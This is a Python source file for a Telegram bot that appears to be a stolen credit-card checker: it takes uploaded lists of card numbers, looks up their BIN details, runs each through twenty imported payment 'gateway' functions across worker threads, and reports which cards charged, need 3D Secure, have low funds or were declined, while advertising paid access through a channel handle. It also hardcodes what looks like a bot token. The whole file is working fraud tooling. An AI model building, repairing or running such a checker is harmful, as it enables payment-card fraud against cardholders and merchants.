import requests
import telebot, time
from telebot import types
import threading, os, re
from collections import deque

from m1 import go0, go1, go2, go3, go4, go5, go6, go7, go8, go9, go10,go11,go12,go13,go14, go15, go16, go17, go18, go19

token = "8594965177:AAEz4rJRR1D7Mg9R2LE9L7Y6Shp3BXN_HlA"
bot = telebot.TeleBot(token, parse_mode="HTML")

# -------------------------
# OWNER & AUTHORIZED USERS
# -------------------------
owner_id = "7954343626"
allowed_users = set([owner_id])
AUTH_FILE = "authorized_users.txt"

if os.path.exists(AUTH_FILE):
    with open(AUTH_FILE, "r") as f:
        for line in f:
            allowed_users.add(line.strip())

# -------------------------
# CONFIG
# -------------------------
WORKERS = 3
FUNCTIONS = [go0, go1, go2, go3, go4, go5, go6, go7, go8, go9, go10,go11,go12,go13,go14, go15, go16, go17, go18, go19]

# -------------------------
# GLOBAL SHARED STATE
# -------------------------
card_queue = None
func_index = 0
queue_lock = threading.Lock()

# -------------------------
# Track running files per user
# -------------------------
user_running_files = {}  # user_id -> True/False

# -------------------------
# Save authorized users to file
# -------------------------
def save_users():
    with open(AUTH_FILE, "w") as f:
        for uid in allowed_users:
            f.write(f"{uid}\n")

# -------------------------
# AUTH SYSTEM FOR OWNER
# -------------------------
@bot.message_handler(commands=["auth"])
def auth_user(message):
    if str(message.chat.id) != owner_id:
        bot.reply_to(message, "❌ Only Owner can use /auth command.")
        return

    try:
        parts = message.text.split()
        if len(parts) != 3:
            bot.reply_to(message, "Usage:\n/auth add <user_id>\n/auth remove <user_id>")
            return

        action = parts[1].lower()
        user_id = parts[2]

        if action == "add":
            allowed_users.add(user_id)
            save_users()
            bot.reply_to(message, f"✅ Authorized: {user_id}")

        elif action == "remove":
            allowed_users.discard(user_id)
            save_users()
            bot.reply_to(message, f"⛔ Removed: {user_id}")

        else:
            bot.reply_to(message, "Usage:\n/auth add <user_id>\n/auth remove <user_id>")

    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

# -------------------------
# START COMMAND
# -------------------------
@bot.message_handler(commands=["start"])
def start(message):
    user_id = str(message.chat.id)
    if user_id not in allowed_users:
        bot.reply_to(message, "❌ You are not authorized to use this bot.")
        return
    bot.reply_to(message, "Send the file now")

SAVE_FILE = "unfortunately.txt"
# -------------------------
def process_cards(message, ko, total, stats):
    global func_index, card_queue
    dd, live, ch, ccn, cvv, lowfund = stats

    while True:
        with queue_lock:
            if not card_queue:
                # run အပြီးမှာ txt file ကို user ကိုပို့
                if os.path.exists(SAVE_FILE):
                    with open(SAVE_FILE, "rb") as f:
                        bot.send_document(message.chat.id, f, caption="Here are the cards with 'Unfortunately' 😢")
                    os.remove(SAVE_FILE)
                return

            cc = card_queue.popleft()
            func = FUNCTIONS[func_index]
            func_index = (func_index + 1) % len(FUNCTIONS)

        # STOP
        if os.path.exists("stop.stop"):
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=ko,
                text='STOP ✅\nBOT BY ➜ @strawhatchannel69'
            )
            os.remove("stop.stop")
            return

        try:
            data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
        except:
            data = {}

        brand = data.get('brand','Unknown')
        card_type = data.get('type','Unknown')
        country = data.get('country_name','Unknown')
        country_flag = data.get('country_flag','Unknown')
        bank = data.get('bank','Unknown')

        start_time = time.time()

        try:
            last = str(func(cc))
        except:
            last = "ERROR"

        time.sleep(5)

        execution_time = time.time() - start_time

        print(f"[{threading.current_thread().name}] {func.__name__} → {cc}")

        # -----------------------------
        # RESULT NORMALIZE
        # -----------------------------
        if "succeeded" in last or "Thank" in last or "redirectUrl" in last:
            msg = f'''   
𝐂𝐀𝐑𝐃: <code>{cc}</code>\n\n𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>Transaction was successful 🔥</code>

𝐁𝐢𝐧 𝐈𝐧𝐟𝐨: <code>{cc[:6]}-{card_type} - {brand}</code>
𝐁𝐚𝐧𝐤: <code>{bank}</code>
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {country_flag}</code>

𝐓𝐢𝐦𝐞: <code>{"{:.1f}".format(execution_time)} second</code> 
𝐁𝐨𝐭 𝐀𝐛𝐨𝐮𝐭: @strawhatchannel69'''
            ch[0] += 1
            bot.reply_to(message, msg)
            result = "Transaction was successful"            
        elif "sufficient" in last.lower():
            msg = f'''   
𝐂𝐀𝐑𝐃: <code>{cc}</code>\n\n𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>Insufficient Funds 🔥</code>

𝐁𝐢𝐧 𝐈𝐧𝐟𝐨: <code>{cc[:6]}-{card_type} - {brand}</code>
𝐁𝐚𝐧𝐤: <code>{bank}</code>
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {country_flag}</code>

𝐓𝐢𝐦𝐞: <code>{"{:.1f}".format(execution_time)} second</code> 
𝐁𝐨𝐭 𝐀𝐛𝐨𝐮𝐭: @strawhatchannel69'''
            bot.reply_to(message, msg)
            result = "Insufficient Funds"
            lowfund[0] += 1
        elif "requires_action" in last or "nextAction" in last:
            msg = f'''   
𝐂𝐀𝐑𝐃: <code>{cc}</code>\n\n𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>3D requires_action 🔥</code>

𝐁𝐢𝐧 𝐈𝐧𝐟𝐨: <code>{cc[:6]}-{card_type} - {brand}</code>
𝐁𝐚𝐧𝐤: <code>{bank}</code>
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {country_flag}</code>

𝐓𝐢𝐦𝐞: <code>{"{:.1f}".format(execution_time)} second</code> 
𝐁𝐨𝐭 𝐀𝐛𝐨𝐮𝐭: @strawhatchannel69'''
            cvv[0] += 1
            bot.reply_to(message, msg)
            result = "3D requires_action"
        elif "Unfortunately" in last:
            # ✅ append to txt file
            with open(SAVE_FILE, "a") as f:
                f.write(cc + "\n")
            dd[0] += 1
            result = last
        else:
          match = re.search(r'"message"\s*:\s*"([^"]+)"', last)
          if match:
          	result = match.group(1)
          	dd[0] += 1
          else:
          	match = last
          	if match:
          		raw = match.group(1)
          		items = re.findall(r'"([^"]+)"', raw)
          		result = " | ".join(items) if items else "Unknown Error - Try Again 🚫"
          		dd[0] += 1
          	else:
          		result = "Unknown Error - Try Again 🚫"
          		dd[0] += 1

        mes = types.InlineKeyboardMarkup(row_width=1)

        mes.add(
            types.InlineKeyboardButton(f"• CHARGED ➜ [ {ch[0]} ] •", callback_data='x'),            
            types.InlineKeyboardButton(f"• CVV ➜ [ {cvv[0]} ] •", callback_data='x'),
            types.InlineKeyboardButton(f"• LOW FUNDS ➜ [ {lowfund[0]} ] •", callback_data='x'),
            types.InlineKeyboardButton(f"• DECLINED ➜ [ {dd[0]} ] •", callback_data='x'),
            types.InlineKeyboardButton(f"• TOTAL ➜ [ {total} ] •", callback_data='x'),
            types.InlineKeyboardButton("[ STOP ]", callback_data='stop')
        )

        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=ko,
            text=f"""
CARD: <code>{cc}</code>\n
RESPONSE: <code>{result}</code>

TIME: <code>{execution_time:.1f}s</code>
WORKER: <b>{threading.current_thread().name}</b>
GATEWAY: <b>{func.__name__}</b>
""",
            reply_markup=mes
        )

# -------------------------
user_running_files = {}
@bot.message_handler(content_types=["document"])
def main(message):
    user_id = str(message.chat.id)

    if user_id not in allowed_users:
        bot.reply_to(message, "You cannot use the bot to contact developers to purchase a bot subscription @strawhatchannel69")
        return

    # ❌ check if user already has a file running
    if user_running_files.get(user_id, False):
        bot.reply_to(message, "❌ You already have a file running. Please wait until it finishes.")
        return

    # ✅ mark as running
    user_running_files[user_id] = True

    try:
        ko = bot.reply_to(message, "CHECKING....⌛").message_id

        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)

        with open("combo.txt", "wb") as f:
            f.write(downloaded)

        with open("combo.txt", "r") as f:
            cards = [x.strip() for x in f if x.strip()]

        total = len(cards)

        dd=[0]; live=[0]; ch=[0]; ccn=[0]; cvv=[0]; lowfund=[0]
        stats = (dd, live, ch, ccn, cvv, lowfund)

        # 🔥 init queue
        global card_queue, func_index
        card_queue = deque(cards)
        func_index = 0

        threads = []
        for i in range(WORKERS):
            t = threading.Thread(
                target=process_cards,
                args=(message, ko, total, stats),
                name=f"Worker-{i}"
            )
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=ko,
            text="CHECKED ✅\nBOT BY ➜ @strawhatchannel69"
        )

    finally:
        user_running_files[user_id] = False

# -------------------------
@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def stop_bot(call):
    open("stop.stop", "w").close()

print("BOT STARTED")
bot.infinity_polling(timeout=60, long_polling_timeout=60)
